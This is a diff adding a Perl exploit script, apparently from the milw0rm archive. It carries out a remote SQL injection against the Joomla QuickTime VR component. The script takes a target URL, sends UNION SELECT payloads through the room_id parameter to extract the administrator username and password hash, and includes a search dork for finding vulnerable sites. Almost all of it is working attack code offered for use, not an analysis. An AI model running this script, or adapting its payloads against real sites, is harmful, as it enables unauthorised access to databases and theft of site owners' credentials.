@@ -1,0 +1,63 @@
+#!/usr/bin/perl -w
+
+#   Joomla Component QuickTime VR v 0.1  Remote SQL Injection #
+########################################
+#[*] Found by : Houssamix From H-T Team 
+#[*] H-T Team [ HouSSaMix + ToXiC350 ] 
+#[*] Greetz : Mr.Al3FrItE & Islamic Security Team  & Mounita20 & CoNaN and all musulmans hackers
+
+#[*] Component_Name:  QuickTime VR
+#[*] Script_Name: Joomla
+#[*] Dork : index.php?option=com_vr
+########################################
+# <name>QuickTime VR</name>
+# <creationDate>Januari 2007</creationDate>
+# <author>Bob</author>
+# <copyright>Pictura</copyright>
+# <authorEmail>bob@pictura-dp.nl</authorEmail>
+# <authorUrl>http://www.pictura-dp.nl/</authorUrl>
+#  <version>0.1</version> 
+
+
+system("color f");
+print "\t\t########################################################\n\n";
+print "\t\t#                        Viva Islam                    #\n\n";
+print "\t\t########################################################\n\n";
+print "\t\t# Joomla Component QuickTime VR Remote SQL Injection   #\n\n";
+print "\t\t#       H-T Team [HouSSaMiX - ToXiC350]	              #\n\n";
+print "\t\t########################################################\n\n";
+
+use LWP::UserAgent;
+
+print "\nEnter your Target (http://site.com/joomla/): ";
+	chomp(my $target=<STDIN>);
+
+$uname="username";
+$magic="jos_users";
+
+$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
+$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
+
+$host = $target . "index.php?option=com_vr&Itemid=78&task=viewer&room_id=-1%20union%20select%20concat(CHAR(60,117,115,101,114,62),".$uname.",CHAR(60,117,115,101,114,62)),2 from/**/".$magic."/**";
+$res = $b->request(HTTP::Request->new(GET=>$host));
+$answer = $res->content;
+
+print "\n[+] The Target : ".$target."";
+
+if ($answer =~ /<user>(.*?)<user>/){
+       
+		print "\n[+] Admin User : $1";
+}
+$host2 = $target . "index.php?option=com_vr&Itemid=78&task=viewer&room_id=-1%20union%20select%20password,2/**/from/**/jos_users--";
+$res2 = $b->request(HTTP::Request->new(GET=>$host2));
+$answer = $res2->content;
+if ($answer =~/([0-9a-fA-F]{32})/){
+		print "\n[+] Admin Hash : $1\n\n";
+		print "#   Exploit succeed!  #\n\n";
+}
+else{print "\n[-] Exploit Failed...\n";
+}
+
+# codec  by Houssamix From H-T Team
+
+# milw0rm.com [2008-07-02]
